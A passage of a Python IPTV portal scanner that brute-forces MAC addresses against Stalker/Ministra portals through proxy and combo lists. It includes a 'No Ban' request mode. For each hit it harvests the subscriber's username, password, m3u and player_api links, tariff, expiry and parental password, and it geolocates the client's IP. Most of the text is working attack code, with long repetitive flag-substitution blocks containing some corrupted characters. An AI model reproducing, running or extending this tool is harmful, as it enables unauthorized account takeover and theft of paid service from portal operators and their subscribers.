				pas=str(link.replace('movie/','').split('/')[4])
				cid=duzel2(veri,'id')
				m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
				
		hitecho(mac,trh)
		hit=hit+1
		hitr="\33[1;36m"
		veri=""
		if user=="":
			while True:
				try:
					res = ses.get(url7(cid), headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
					veri=str(res.text)
					if 'ffmpeg ' in veri:
					     link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
					else:
					     if 'cmd":"' in veri:
					     	link=veri.split('cmd":"')[1].split('"')[0].replace('\/','/')
					     	user=login
					     	pas=password
					     	real='http://'+link.split('://')[1].split('/')[0]+'/c/'
					if 'ffmpeg ' in veri:
					     user=str(link.replace('live/','').split('/')[3])
					     pas=str(link.replace('live/','').split('/')[4])
					     if real==panel:
					     	real='http://'+link.split('://')[1].split('/')[0]+'/c/'
					m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
				
					break
				except:pass
		durum=""
		if not link=="":
			try:
				durum=goruntu(link,cid)
			except:pass
		if not m3ulink=="":
			playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			plink=real.replace('http://','').replace('/c/','')
			playerapi=m3uapi(playerlink,mac,token)
			m3uimage=m3ugoruntu(cid,user,pas,plink)
			if playerapi=="":
			    playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			    plink=panel.replace('http://','').replace('/c/','')
			    playerapi=m3uapi(playerlink,mac,token)
			    m3uimage=m3ugoruntu(cid,user,pas,plink)
		if m3uimage=="Offline":
			m3uvpn=m3uvpn+1
		else:
			m3uon=m3uon+1
		if durum=="🔒 , ✔" or durum=="":
			macvpn=macvpn+1
		else:
			macon=macon+1
		vpn=""
		if not ip =="":
			vpn=vpnip(ip)
		else:
			vpn="No Client IP"

		pal=""
		url5="https://ipapi.co/"+ip+"/json/" 
		while True:
    		 try:
        		 res = ses.get(url5, timeout=15, verify=False)
        		 break
    		 except:
        		 bag1=0
        		 bag1=bag1+1
        		 time.sleep(bekleme)
        		 if bag1==4:
            		  break
		            	
		try:
		       bag1=0
		       veri=str(res.text)
		       scountry=""
		       country_name =""
		       scountry=veri.split('country_code": "')[1]
		       scountry=scountry.split('"')[0]
		       country_name=veri.split('country_name": "')[1]
		       country_name=country_name.split('"')[0]	
		       clisp = veri.split('isp_name": "')[1]
		       clisp = str(clisp.split('"')[0].encode('utf-8').decode('unicode-escape'))
		       clipad = veri.split('ip": "')[1]
		       clipad = clipad.split('"')[0]
		
		except:pass	


		
		kanalsayisi=""
		filmsayisi=""
		dizisayisi=""
		livelist=""
		vodlist=""
		serieslist=""

		liveurl=http+"://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"
		if not expires=="":
			liveurl=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml" 
		if uzmanm=="stalker_portal/server/load.php":
			liveurl=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml"
		vodurl=http+"://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
		seriesurl=http+"://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"
		if kanalkata=="1" or kanalkata=="2":
			listlink=liveurl
			livel='⍟'
			livelist=list(listlink,mac,token,livel)
			livelist=livelist.upper()
			livelist=livelist.replace("«»","")
			livelist=livelist.replace("⍟DE"," 🇩🇪 DE")
			livelist=livelist.replace("⍟LU"," 🇱🇺 LU") 
			livelist=livelist.replace("⍟PT"," 🇵🇹 PT")
			livelist=livelist.replace("⍟ALB"," 🇦🇱 ALB")
			livelist=livelist.replace("⍟TR"," 🇹🇷 TR")
			livelist=livelist.replace("⍟PL"," 🇵🇱 PL")
			livelist=livelist.replace("⍟UK"," 🇺🇦 UK")
			livelist=livelist.replace("⍟HR"," 🇭🇷 HR")
			livelist=livelist.replace("⍟BIH"," 🇧🇦 BIH")
			livelist=livelist.replace("⍟MKD"," 🇲🇰 MKD")
			livelist=livelist.replace("⍟SRB"," 🇷🇸 SRB")
			livelist=livelist.replace("⍟SL"," 🇸🇮 SL")
			livelist=livelist.replace("⍟YU"," 🇪🇭 YU")
			livelist=livelist.replace("⍟EX"," 🇪🇭 EX")
			livelist=livelist.replace("⍟IE"," 🇮🇪 IE")
			livelist=livelist.replace("⍟SRB"," 🇷🇸 SRB")
			livelist=livelist.replace("⍟KU"," 🇭🇺 KU")
			livelist=livelist.replace("⍟BO"," 🇧🇴 BO")
			livelist=livelist.replace("⍟BG"," 🇧🇬 BG")
			livelist=livelist.replace("⍟NO"," 🇳🇴 NO")
			livelist=livelist.replace("⍟PT"," 🇵🇹 PT")
			livelist=livelist.replace("⍟SG"," 🇸🇬 SG")
			livelist=livelist.replace("⍟FI"," 🇫🇮 FI")
			livelist=livelist.replace("⍟CZ"," 🇨🇿 CZ")
			livelist=livelist.replace("⍟MY"," 🇲🇾 MY")
			livelist=livelist.replace("⍟PH"," 🇵🇭 PH")
			livelist=livelist.replace("⍟QA"," 🇶🇦 QA")
			livelist=livelist.replace("⍟CH"," 🇨🇭 CH")
			livelist=livelist.replace("⍟EC"," 🇪🇨 EC")
			livelist=livelist.replace("⍟PA"," 🇵🇦 PA")
			livelist=livelist.replace("⍟PE"," 🇵🇪 PE")
			livelist=livelist.replace("⍟CL"," 🇨🇱 CL")
			livelist=livelist.replace("⍟HR"," 🇭🇷 HR")
			livelist=livelist.replace("⍟IL"," 🇮🇪 IL")
			livelist=livelist.replace("⍟IR"," 🇮🇪 IR")
			livelist=livelist.replace("⍟KE"," 🇰🇪 KE")
			livelist=livelist.replace("⍟PT"," 🇵🇹 PT")
			livelist=livelist.replace("⍟ZA"," 🇿🇦 ZA")
			livelist=livelist.replace("⍟KR"," 🇰🇷 KR")
			livelist=livelist.replace("⍟GB"," 🇬🇧 GB")
			livelist=livelist.replace("⍟EN"," 🇬🇧 EN")
			livelist=livelist.replace("⍟UK"," 🇬🇧 UK")
			livelist=livelist.replace("⍟TW"," 🇹🇼 TW")
			livelist=livelist.replace("⍟VN"," 🇻🇳 VN")
			livelist=livelist.replace("⍟AR"," 🇦🇷 AR")
			livelist=livelist.replace("⍟CA"," 🇨🇦 CA")
			livelist=livelist.replace("⍟DK"," 🇩🇰 DK")
			livelist=livelist.replace("⍟AT"," 🇦🇹 AT")
			livelist=livelist.replace("⍟BE"," 🇧🇪 BE")
			livelist=livelist.replace("⍟NL"," 🇳🇱 NL")
			livelist=livelist.replace("⍟LU"," 🇱🇺 LU")
			livelist=livelist.replace("⍟SE"," 🇸🇪 SE")
			livelist=livelist.replace("⍟CH"," 🇨🇭 CH")
			livelist=livelist.replace("⍟SW"," 🇨🇭 SW")
			livelist=livelist.replace("⍟IT"," 🇮🇹 IT")
			livelist=livelist.replace("⍟ES"," 🇪🇸 ES")
			livelist=livelist.replace("⍟FR"," 🇫🇷 FR")
			livelist=livelist.replace("⍟FI"," 🇫🇮 FI")
			livelist=livelist.replace("⍟GR"," 🇬🇷 GR")
			livelist=livelist.replace("⍟HU"," 🇭🇺 HU")
			livelist=livelist.replace("⍟IE"," 🇮🇪 IE")
			livelist=livelist.replace("⍟NO"," 🇳🇴 NO")
			livelist=livelist.replace("⍟PL"," 🇵🇱 PL")
			livelist=livelist.replace("⍟RO"," 🇷🇴 RO")
			livelist=livelist.replace("⍟AU"," 🇦🇺 AU")
			livelist=livelist.replace("⍟BR"," 🇧🇷 BR")
			livelist=livelist.replace("⍟CN"," 🇨🇳 CN")
			livelist=livelist.replace("⍟IN"," 🇮🇳 IN")
			livelist=livelist.replace("⍟JP"," 🇯🇵 JP")
			livelist=livelist.replace("⍟MX"," 🇲🇽 MX")
			livelist=livelist.replace("⍟NZ"," 🇳🇿 NZ")
			livelist=livelist.replace("⍟SA"," 🇸🇦 SA")
			livelist=livelist.replace("⍟KR"," 🇰🇷 KR")
			livelist=livelist.replace("⍟TH"," 🇹🇭 TH")
			livelist=livelist.replace("⍟TR"," 🇹🇷 TR")
			livelist=livelist.replace("⍟AE"," 🇦🇪 AE")
			livelist=livelist.replace("⍟ZA"," 🇿🇦 ZA")
			livelist=livelist.replace("⍟AF"," 🇿🇦 AF")
			livelist=livelist.replace("⍟CL"," 🇨🇱 CL")
			livelist=livelist.replace("⍟CO"," 🇨🇴 CO")
			livelist=livelist.replace("⍟EG"," 🇪🇬 EG")
			livelist=livelist.replace("⍟ID"," 🇮🇩 ID")
			livelist=livelist.replace("⍟NG"," 🇳🇬 NG")
			livelist=livelist.replace("⍟MY"," 🇲🇾 MY")
			livelist=livelist.replace("⍟AT"," 🇦🇹 AT")
			livelist=livelist.replace("⍟BR"," 🇧🇷 BR")
			livelist=livelist.replace("⍟CA"," 🇨🇦 CA")
			livelist=livelist.replace("⍟DK"," ??🇰 DK")
			livelist=livelist.replace("⍟EG"," 🇪🇬 EG")
			livelist=livelist.replace("⍟FR"," 🇫🇷 FR")
			livelist=livelist.replace("⍟GR"," 🇬🇷 GR")
			livelist=livelist.replace("⍟HU"," 🇭🇺 HU")
			livelist=livelist.replace("⍟IN"," 🇮🇳 IN")
			livelist=livelist.replace("⍟JP"," 🇯🇵 JP")
			livelist=livelist.replace("⍟KR"," 🇰🇷 KR")
			livelist=livelist.replace("⍟MX"," 🇲🇽 MX")
			livelist=livelist.replace("⍟NZ"," 🇳🇿 NZ")
			livelist=livelist.replace("⍟PL"," 🇵🇱 PL")
			livelist=livelist.replace("⍟RU"," 🇷🇺 RU")
			livelist=livelist.replace("⍟SA"," 🇸🇦 SA")
			livelist=livelist.replace("⍟TR"," 🇹🇷 TR")
			livelist=livelist.replace("⍟US"," 🇺🇸 US")
			livelist=livelist.replace("⍟VN"," 🇻🇳 VN")
			livelist=livelist.replace("⍟ZA"," 🇿🇦 ZA")
			livelist=livelist.replace("⍟AU"," 🇦🇺 AU")
			livelist=livelist.replace("⍟BE"," 🇧🇪 BE")
			livelist=livelist.replace("⍟CN"," 🇨🇳 CN")
			livelist=livelist.replace("⍟DK"," 🇩🇰 DK")
			livelist=livelist.replace("⍟FI"," 🇫🇮 FI")
			
		if kanalkata=="2":
			listlink=vodurl
			livel='⍟'
			vodlist=list(listlink,mac,token,livel)
			vodlist=vodlist.upper()
			vodlist=vodlist.replace("«»","")
			vodlist=vodlist.replace("⍟DE"," 🇩🇪 DE")
			vodlist=vodlist.replace("⍟LU"," 🇱🇺 LU") 
			vodlist=vodlist.replace("⍟PT"," 🇵🇹 PT")
			vodlist=vodlist.replace("⍟ALB"," 🇦🇱 ALB")
			vodlist=vodlist.replace("⍟TR"," 🇹🇷 TR")
			vodlist=vodlist.replace("⍟PL"," 🇵🇱 PL")
			vodlist=vodlist.replace("⍟UK"," 🇺🇦 UK")
			vodlist=vodlist.replace("⍟RU"," 🇷🇺 RU")
			vodlist=vodlist.replace("⍟HR"," 🇭🇷 HR")
			vodlist=vodlist.replace("⍟BIH"," 🇧🇦 BIH")
			vodlist=vodlist.replace("⍟MKD"," 🇲🇰 MKD")
			vodlist=vodlist.replace("⍟SRB"," 🇷🇸 SRB")
			vodlist=vodlist.replace("⍟SL"," 🇸🇮 SL")
			vodlist=vodlist.replace("⍟YU"," 🇪🇭 YU")
			vodlist=vodlist.replace("⍟EX"," 🇪🇭 EX")
			vodlist=vodlist.replace("⍟IE"," 🇮🇪 IE")
			vodlist=vodlist.replace("⍟SRB"," 🇷🇸 SRB")
			vodlist=vodlist.replace("⍟KU"," 🇭🇺 KU")
			vodlist=vodlist.replace("⍟BO"," 🇧🇴 BO")
			vodlist=vodlist.replace("⍟BG"," 🇧🇬 BG")
			vodlist=vodlist.replace("⍟NO"," 🇳🇴 NO")
			vodlist=vodlist.replace("⍟SG"," 🇸🇬 SG")
			vodlist=vodlist.replace("⍟FI"," 🇫🇮 FI")
			vodlist=vodlist.replace("⍟CZ"," 🇨🇿 CZ")
			vodlist=vodlist.replace("⍟MY"," 🇲🇾 MY")
			vodlist=vodlist.replace("⍟PH"," 🇵🇭 PH")
			vodlist=vodlist.replace("⍟QA"," 🇶🇦 QA")
			vodlist=vodlist.replace("⍟CH"," 🇨🇭 CH")
			vodlist=vodlist.replace("⍟EC"," 🇪🇨 EC")
			vodlist=vodlist.replace("⍟PA"," 🇵🇦 PA")
			vodlist=vodlist.replace("⍟PE"," 🇵🇪 PE")
			vodlist=vodlist.replace("⍟CL"," 🇨🇱 CL")
			vodlist=vodlist.replace("⍟HR"," 🇭🇷 HR")
			vodlist=vodlist.replace("⍟IL"," 🇮🇪 IL")
			vodlist=vodlist.replace("⍟IR"," 🇮🇪 IR")
			vodlist=vodlist.replace("⍟KE"," 🇰🇪 KE")
			vodlist=vodlist.replace("⍟ZA"," 🇿🇦 ZA")
			vodlist=vodlist.replace("⍟KR"," 🇰🇷 KR")
			vodlist=vodlist.replace("⍟GB"," 🇬🇧 GB")
			vodlist=vodlist.replace("⍟EN"," 🇬🇧 EN")
			vodlist=vodlist.replace("⍟UK"," 🇬🇧 UK")
			vodlist=vodlist.replace("⍟TW"," 🇹🇼 TW")
			vodlist=vodlist.replace("⍟VN"," 🇻🇳 VN")
			vodlist=vodlist.replace("⍟AR"," 🇦🇷 AR")
			vodlist=vodlist.replace("⍟CA"," 🇨🇦 CA")
			vodlist=vodlist.replace("⍟DK"," 🇩🇰 DK")
			vodlist=vodlist.replace("⍟AT"," 🇦🇹 AT")
			vodlist=vodlist.replace("⍟BE"," 🇧🇪 BE")
			vodlist=vodlist.replace("⍟NL"," 🇳🇱 NL")
			vodlist=vodlist.replace("⍟LU"," 🇱🇺 LU")
			vodlist=vodlist.replace("⍟SE"," 🇸🇪 SE")
			vodlist=vodlist.replace("⍟CH"," 🇨🇭 CH")
			vodlist=vodlist.replace("⍟SW"," 🇨🇭 SW")
			vodlist=vodlist.replace("⍟IT"," 🇮🇹 IT")
			vodlist=vodlist.replace("⍟ES"," 🇪🇸 ES")
			vodlist=vodlist.replace("⍟FR"," 🇫🇷 FR")
			vodlist=vodlist.replace("⍟FI"," 🇫🇮 FI")
			vodlist=vodlist.replace("⍟GR"," 🇬🇷 GR")
			vodlist=vodlist.replace("⍟HU"," 🇭🇺 HU")
			vodlist=vodlist.replace("⍟IE"," 🇮🇪 IE")
			vodlist=vodlist.replace("⍟NO"," 🇳🇴 NO")
			vodlist=vodlist.replace("⍟PL"," 🇵🇱 PL")
			vodlist=vodlist.replace("⍟RO"," 🇷🇴 RO")
			vodlist=vodlist.replace("⍟RU"," 🇷🇺 RU")
			vodlist=vodlist.replace("⍟AU"," 🇦🇺 AU")
			vodlist=vodlist.replace("⍟BR"," 🇧🇷 BR")
			vodlist=vodlist.replace("⍟CN"," 🇨🇳 CN")
			vodlist=vodlist.replace("⍟IN"," 🇮🇳 IN")
			vodlist=vodlist.replace("⍟JP"," 🇯🇵 JP")
			vodlist=vodlist.replace("⍟MX"," 🇲🇽 MX")
			vodlist=vodlist.replace("⍟NZ"," 🇳🇿 NZ")
			vodlist=vodlist.replace("⍟SA"," 🇸🇦 SA")
			vodlist=vodlist.replace("⍟KR"," 🇰🇷 KR")
			vodlist=vodlist.replace("⍟TH"," 🇹🇭 TH")
			vodlist=vodlist.replace("⍟TR"," 🇹🇷 TR")
			vodlist=vodlist.replace("⍟AE"," 🇦🇪 AE")
			vodlist=vodlist.replace("⍟ZA"," 🇿🇦 ZA")
			vodlist=vodlist.replace("⍟AF"," 🇿🇦 AF")
			vodlist=vodlist.replace("⍟CL"," 🇨🇱 CL")
			vodlist=vodlist.replace("⍟CO"," 🇨🇴 CO")
			vodlist=vodlist.replace("⍟EG"," 🇪🇬 EG")
			vodlist=vodlist.replace("⍟ID"," 🇮🇩 ID")
			vodlist=vodlist.replace("⍟NG"," 🇳🇬 NG")
			vodlist=vodlist.replace("⍟MY"," 🇲🇾 MY")
			vodlist=vodlist.replace("⍟AT"," 🇦🇹 AT")
			vodlist=vodlist.replace("⍟BR"," 🇧🇷 BR")
			vodlist=vodlist.replace("⍟CA"," 🇨🇦 CA")
			vodlist=vodlist.replace("⍟DK"," 🇩🇰 DK")
			vodlist=vodlist.replace("⍟EG"," 🇪🇬 EG")
			vodlist=vodlist.replace("⍟FR"," 🇫🇷 FR")
			vodlist=vodlist.replace("⍟GR"," 🇬🇷 GR")
			vodlist=vodlist.replace("⍟HU"," 🇭🇺 HU")
			vodlist=vodlist.replace("⍟IN"," 🇮🇳 IN")
			vodlist=vodlist.replace("⍟JP"," 🇯🇵 JP")
			vodlist=vodlist.replace("⍟KR"," 🇰🇷 KR")
			vodlist=vodlist.replace("⍟MX"," 🇲🇽 MX")
			vodlist=vodlist.replace("⍟NZ"," 🇳🇿 NZ")
			vodlist=vodlist.replace("⍟PL"," 🇵🇱 PL")
			vodlist=vodlist.replace("⍟RU"," 🇷🇺 RU")
			vodlist=vodlist.replace("⍟RUS"," 🇷🇺 RUS")
			vodlist=vodlist.replace("⍟SA"," 🇸🇦 SA")
			vodlist=vodlist.replace("⍟TR"," 🇹🇷 TR")
			vodlist=vodlist.replace("⍟US"," 🇺🇸 US")
			vodlist=vodlist.replace("⍟VN"," 🇻🇳 VN")
			vodlist=vodlist.replace("⍟ZA"," 🇿🇦 ZA")
			vodlist=vodlist.replace("⍟AU"," 🇦🇺 AU")
			vodlist=vodlist.replace("⍟BE"," 🇧🇪 BE")
			vodlist=vodlist.replace("⍟CN"," 🇨🇳 CN")
			vodlist=vodlist.replace("⍟DK"," 🇩🇰 DK")
			vodlist=vodlist.replace("⍟FI"," 🇫🇮 FI")
			
			listlink=seriesurl
			livel='⍟'
			serieslist=list(listlink,mac,token,livel)
			serieslist=serieslist.upper()
			serieslist=serieslist.replace("«»","")
			serieslist=serieslist.replace("⍟DE"," 🇩🇪 DE")
			serieslist=serieslist.replace("⍟LU"," 🇱🇺 LU") 
			serieslist=serieslist.replace("⍟PT"," 🇵🇹 PT")
			serieslist=serieslist.replace("⍟ALB"," 🇦🇱 ALB")
			serieslist=serieslist.replace("⍟TR"," 🇹🇷 TR")
			serieslist=serieslist.replace("⍟PL"," 🇵🇱 PL")
			serieslist=serieslist.replace("⍟UK"," 🇺🇦 UK")
			serieslist=serieslist.replace("⍟RU"," 🇷🇺 RU")
			serieslist=serieslist.replace("⍟HR"," 🇭🇷 HR")
			serieslist=serieslist.replace("⍟BIH"," 🇧🇦 BIH")
			serieslist=serieslist.replace("⍟MKD"," 🇲🇰 MKD")
			serieslist=serieslist.replace("⍟SRB"," 🇷🇸 SRB")
			serieslist=serieslist.replace("⍟SL"," 🇸🇮 SL")
			serieslist=serieslist.replace("⍟YU"," 🇪🇭 YU")
			serieslist=serieslist.replace("⍟EX"," 🇪🇭 EX")
			serieslist=serieslist.replace("⍟IE"," 🇮🇪 IE")
			serieslist=serieslist.replace("⍟SRB"," 🇷🇸 SRB")
			serieslist=serieslist.replace("⍟KU"," 🇭🇺 KU")
			serieslist=serieslist.replace("⍟BO"," 🇧🇴 BO")
			serieslist=serieslist.replace("⍟BG"," 🇧🇬 BG")
			serieslist=serieslist.replace("⍟NO"," 🇳🇴 NO")
			serieslist=serieslist.replace("⍟PT"," 🇵🇹 PT")
			serieslist=serieslist.replace("⍟SG"," 🇸🇬 SG")
			serieslist=serieslist.replace("⍟FI"," 🇫🇮 FI")
			serieslist=serieslist.replace("⍟CZ"," 🇨🇿 CZ")
			serieslist=serieslist.replace("⍟MY"," 🇲🇾 MY")
			serieslist=serieslist.replace("⍟PH"," 🇵🇭 PH")
			serieslist=serieslist.replace("⍟QA"," 🇶🇦 QA")
			serieslist=serieslist.replace("⍟CH"," 🇨🇭 CH")
			serieslist=serieslist.replace("⍟EC"," 🇪🇨 EC")
			serieslist=serieslist.replace("⍟PA"," 🇵🇦 PA")
			serieslist=serieslist.replace("⍟PE"," 🇵🇪 PE")
			serieslist=serieslist.replace("⍟CL"," 🇨🇱 CL")
			serieslist=serieslist.replace("⍟HR"," 🇭🇷 HR")
			serieslist=serieslist.replace("⍟IR"," 🇮🇪 IR")
			serieslist=serieslist.replace("⍟IL"," 🇮🇪 IL")
			serieslist=serieslist.replace("⍟KE"," ??🇪 KE")
			serieslist=serieslist.replace("⍟RU"," 🇷🇺 RU")
			serieslist=serieslist.replace("⍟ZA"," 🇿🇦 ZA")
			serieslist=serieslist.replace("⍟KR"," 🇰🇷 KR")
			serieslist=serieslist.replace("⍟GB"," 🇬🇧 GB")
			serieslist=serieslist.replace("⍟EN"," 🇬🇧 EN")
			serieslist=serieslist.replace("⍟UK"," 🇬🇧 UK")
			serieslist=serieslist.replace("⍟TW"," 🇹🇼 TW")
			serieslist=serieslist.replace("⍟VN"," 🇻🇳 VN")
			serieslist=serieslist.replace("⍟AR"," 🇦🇷 AR")
			serieslist=serieslist.replace("⍟CA"," 🇨🇦 CA")
			serieslist=serieslist.replace("⍟DK"," 🇩🇰 DK")
			serieslist=serieslist.replace("⍟AT"," 🇦🇹 AT")
			serieslist=serieslist.replace("⍟BE"," 🇧🇪 BE")
			serieslist=serieslist.replace("⍟NL"," 🇳🇱 NL")
			serieslist=serieslist.replace("⍟LU"," 🇱🇺 LU")
			serieslist=serieslist.replace("⍟SE"," 🇸🇪 SE")
			serieslist=serieslist.replace("⍟CH"," 🇨🇭 CH")
			serieslist=serieslist.replace("⍟SW"," 🇨🇭 SW")
			serieslist=serieslist.replace("⍟IT"," 🇮🇹 IT")
			serieslist=serieslist.replace("⍟ES"," 🇪🇸 ES")
			serieslist=serieslist.replace("⍟FR"," 🇫🇷 FR")
			serieslist=serieslist.replace("⍟FI"," 🇫🇮 FI")
			serieslist=serieslist.replace("⍟GR"," 🇬🇷 GR")
			serieslist=serieslist.replace("⍟HU"," 🇭🇺 HU")
			serieslist=serieslist.replace("⍟IE"," 🇮🇪 IE")
			serieslist=serieslist.replace("⍟NO"," 🇳🇴 NO")
			serieslist=serieslist.replace("⍟PL"," 🇵🇱 PL")
			serieslist=serieslist.replace("⍟RO"," 🇷🇴 RO")
			serieslist=serieslist.replace("⍟RU"," 🇷🇺 RU")
			serieslist=serieslist.replace("⍟AU"," 🇦🇺 AU")
			serieslist=serieslist.replace("⍟BR"," 🇧🇷 BR")
			serieslist=serieslist.replace("⍟CN"," 🇨🇳 CN")
			serieslist=serieslist.replace("⍟IN"," 🇮🇳 IN")
			serieslist=serieslist.replace("⍟JP"," 🇯🇵 JP")
			serieslist=serieslist.replace("⍟MX"," 🇲🇽 MX")
			serieslist=serieslist.replace("⍟NZ"," 🇳🇿 NZ")
			serieslist=serieslist.replace("⍟SA"," 🇸🇦 SA")
			serieslist=serieslist.replace("⍟KR"," 🇰🇷 KR")
			serieslist=serieslist.replace("⍟TH"," 🇹🇭 TH")
			serieslist=serieslist.replace("⍟TR"," 🇹🇷 TR")
			serieslist=serieslist.replace("⍟AE"," 🇦🇪 AE")
			serieslist=serieslist.replace("⍟ZA"," 🇿🇦 ZA")
			serieslist=serieslist.replace("⍟AF"," 🇿🇦 AF")
			serieslist=serieslist.replace("⍟CL"," 🇨🇱 CL")
			serieslist=serieslist.replace("⍟CO"," 🇨🇴 CO")
			serieslist=serieslist.replace("⍟EG"," 🇪🇬 EG")
			serieslist=serieslist.replace("⍟ID"," 🇮🇩 ID")
			serieslist=serieslist.replace("⍟NG"," 🇳🇬 NG")
			serieslist=serieslist.replace("⍟MY"," 🇲🇾 MY")
			serieslist=serieslist.replace("⍟AT"," 🇦🇹 AT")
			serieslist=serieslist.replace("⍟BR"," 🇧🇷 BR")
			serieslist=serieslist.replace("⍟CA"," 🇨🇦 CA")
			serieslist=serieslist.replace("⍟DK"," 🇩🇰 DK")
			serieslist=serieslist.replace("⍟EG"," 🇪🇬 EG")
			serieslist=serieslist.replace("⍟FR"," 🇫🇷 FR")
			serieslist=serieslist.replace("⍟GR"," 🇬🇷 GR")
			serieslist=serieslist.replace("⍟HU"," 🇭🇺 HU")
			serieslist=serieslist.replace("⍟IN"," 🇮🇳 IN")
			serieslist=serieslist.replace("⍟JP"," 🇯🇵 JP")
			serieslist=serieslist.replace("⍟KR"," 🇰🇷 KR")
			serieslist=serieslist.replace("⍟MX"," 🇲🇽 MX")
			serieslist=serieslist.replace("⍟NZ"," 🇳🇿 NZ")
			serieslist=serieslist.replace("⍟PL"," 🇵🇱 PL")
			serieslist=serieslist.replace("⍟RU"," 🇷🇺 RU")
			serieslist=serieslist.replace("⍟SA"," 🇸🇦 SA")
			serieslist=serieslist.replace("⍟TR"," 🇹🇷 TR")
			serieslist=serieslist.replace("⍟US"," 🇺🇸 US")
			serieslist=serieslist.replace("⍟VN"," 🇻🇳 VN")
			serieslist=serieslist.replace("⍟ZA"," 🇿🇦 ZA")
			serieslist=serieslist.replace("⍟AU"," 🇦🇺 AU")
			serieslist=serieslist.replace("⍟BE"," 🇧🇪 BE")
			serieslist=serieslist.replace("⍟CN"," 🇨🇳 CN")
			serieslist=serieslist.replace("⍟DK"," 🇩🇰 DK")
			serieslist=serieslist.replace("⍟FI"," 🇫🇮 FI")
		
		hityaz(mac,trh,real,m3ulink,m3uimage,durum,vpn,livelist,vodlist,serieslist,playerapi,fname,tariff_plan,ls,login,password,tariff_plan_id,bill,expire_billing_date,max_online,parent_password,stb_type,comment,country,settings_password,country_name,scountry,kanalsayisi,filmsayisi,dizisayisi,ip)
	

	
	
def vpnip(ip):
    url9 = 'https://ipleak.net/json/' + ip
    vpnip = ''
    vcountry = ''
    vpn = 'No Client IP'
    veri = ''
    
    try:
        res = ses.get(url9, timeout=7, verify=False)
        veri = str(res.text)
    finally:
        pass
    vpn = 'No Client IP'
    if '404 page' not in veri:
        if 'country_name' in veri:
            vpnc = veri.split('city_name": "')[-1]
            vpnc = str(vpnc.split('"')[0].encode('utf-8').decode('unicode-escape'))
            vpnips = veri.split('country_name": "')[1]
            vpnips = vpnips.split('"')[0]
            vcountry = veri.split('country_code": "')[1]
            vcountry = vcountry.split('"')[0]
            vpncont = veri.split('continent_name": "')[1]
            vpncont = vpncont.split('"')[0]
            vpnreg = veri.split('region_name": "')[-1]
            vpnreg = str(vpnreg.split('"')[0].encode('utf-8').decode('unicode-escape'))
            clisp = veri.split('isp_name": "')[1]
            clisp = str(clisp.split('"')[0].encode('utf-8').decode('unicode-escape'))
            clipad = veri.split('ip": "')[1]
            clipad = clipad.split('"')[0]
            vpn = '»' + clipad + '«'+'\n╠☞ℂᴏɴᴛɪɴᴇɴᴛ:'+vpncont +'\n╠☞ℂᴏᴜɴᴛʀʏ: ' + vpnips + ' ✮ ' + data_server(vcountry) + '\n╠☞ℝᴇɢɪᴏɴ: ' + vpnreg + '\nミ★ℂɪᴛʏ: ' + vpnc +  '\n╠☞ℂ𝙻𝙸𝙴𝙽𝚃 𝕀𝚂𝙿:'+clisp 
        else:
            vpn = 'No Client IP'

    return vpn 
import socket

panel=input("\n\033[0;94mEntre Portal =\033[0;91m ")
print()
ban=""
uzmanm="portal.php"
realblue=""
reqs=(
"portal.php",
"c/portal.php",
"server/load.php",
"portal.php - No Ban",
"portal.php - Real Blue",
"portal.php - httpS",
"stalker_portal/server/load.php",
"stalker_portal/server/load.php - old",
"stalker_portal/server/load.php - «▣»",
"stalker_portal/server/load.php - httpS",
)

say=0
for i in reqs:
	say=say+1
	print(str(say)+"╠☞ "+str(i))
say=0
uzmanm=input('\n\033[0;37mSélectionnez un Portal 1~10 = ')
if uzmanm=="0":
	uzmanm=input("Write Request:")
if uzmanm=="":
	uzmanm="portal.php"
	
uzmanm=reqs[int(uzmanm)-1]
if uzmanm=="stalker_portal/server/load.php - old":
	stalker_portal="2"
	uzmanm="stalker_portal/server/load.php"
if uzmanm=="stalker_portal/server/load.php - «▣»":
	stalker_portal="1"
	uzmanm="stalker_portal/server/load.php"	
if uzmanm=="portal.php - No Ban":
	ban="ban"
	uzmanm="portal.php"
http="http"
if uzmanm=="portal.php - Real Blue":
	realblue="real"
	uzmanm="portal.php"
if uzmanm=="portal.php - httpS":
	uzmanm="portal.php"
	http="https"
if uzmanm=="stalker_portal/server/load.php - httpS":
	uzmanm="stalker_portal/server/load.php"
	http="https"
print(uzmanm)
#uzmanm="magLoad.php"

panel=panel.replace('stalker_portal','')
panel=panel.replace('http://','')
panel=panel.replace('/c/','')
panel=panel.replace('/c','')
panel=panel.replace('/','')
panel=panel.replace(' ','')

#http://gotv.one/stalker_portal/c/
import urllib3
import os
def temizle():
    os.system("cls" if os.name == "nt" else "clear")
yeninesil=(
'00:1A:79:',
'D4:CF:F9:',
'33:44:CF:',
'10:27:BE:',
'A0:BB:3E:',
'55:93:EA:',  
'04:D6:AA:',
'11:33:01:',
'00:1C:19:',
'1A:00:6A:',
'1A:00:FB:',
'00:A1:79:',
'00:1B:79:',
'00:2A:79:',
)
comboc=""
combototLen=""
combouz=0
combodosya=""
proxyc=""
proxytotLen=""
proxydosya=""
proxyuz=0
statusproxy=""



def dosyasec():
	global comboc,combototLen,proxyuz,proxydosya,combodosya,proxyc,proxytotLen,proxyuz,combouz,randomturu,serim,seri,mactur,randommu,statusproxy,comboinfo
	say=0
	dsy=""
	
	if comboc=="":
		mesaj="Liste combo Mac,Sélectionnez un Combo.!\nSélectionnez un numéro de combo"
		dir=rootDir+'/combo/'
		dsy="\033[1;91m╠☞ \33[0m\033[36m0 \33[0m\033[0;94m Aléatoire (MAC AUTO)  \33[0m\n"
	else:
		mesaj="Sélectionnez un Combo Proxy.!\Sélectionnez un numéro de combo Proxy"
